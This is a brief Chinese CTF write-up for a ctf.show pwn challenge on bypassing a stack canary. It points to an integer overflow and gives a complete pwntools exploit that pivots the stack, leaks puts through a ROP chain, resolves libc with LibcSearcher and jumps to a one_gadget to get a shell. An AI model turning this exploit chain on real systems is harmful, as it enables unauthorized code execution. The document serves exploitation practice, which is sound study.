# 挑战简介
Bypass Canary 姿势7

# 思路
一样的栈迁移，和上一题差不多，只不过这一次需要你排查出漏洞点，有些复杂  

唯一能看出端倪的函数是sub_401148的函数，其中出现了整形溢出，所以可以利用栈迁移  

```
from pwn import *
from LibcSearcher import *
context(arch = "amd64",os = 'linux',log_level = 'debug')

#context(arch = "i386",os = 'linux',log_level = 'debug')

#io = process("./pwn")

io = remote('pwn.challenge.ctf.show', 28182)

elf = ELF('D:\edge 下载\pwn')

message_dir = 0x6061C0

puts_plt = elf.plt['puts']

puts_got = elf.got['puts']

readn = 0x400F1E

pop_rdi = 0x4044d3

pop_rsi_r15 = 0x4044d1

ret = 0x40150d

io.recvuntil("option:\n")
io.sendline("1")    
io.sendline("No")
io.sendline("yes")
io.sendline("-2")
payload = p64(message_dir) * 37 + p64(ret)
io.sendline(payload)

payload = p64(0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt)
payload += p64(pop_rdi) + p64(message_dir + 0x50) + p64(pop_rsi_r15) + p64(100) + p64(message_dir + 0x50 + 8) + p64(readn) + p64(ret)


io.send(payload)

io.recvuntil("pattern:\n")

# puts = u64(io.recvuntil("\n")[:-1].ljust(8, "\x00"))
puts = u64(io.recv(6).ljust(8, b'\x00'))

libcdb = LibcSearcher('puts', puts)

libc_base = puts - libcdb.dump('puts')

one_gadget = libc_base + 0x4f302

payload = p64(one_gadget)

io.send(payload)

io.interactive()
```
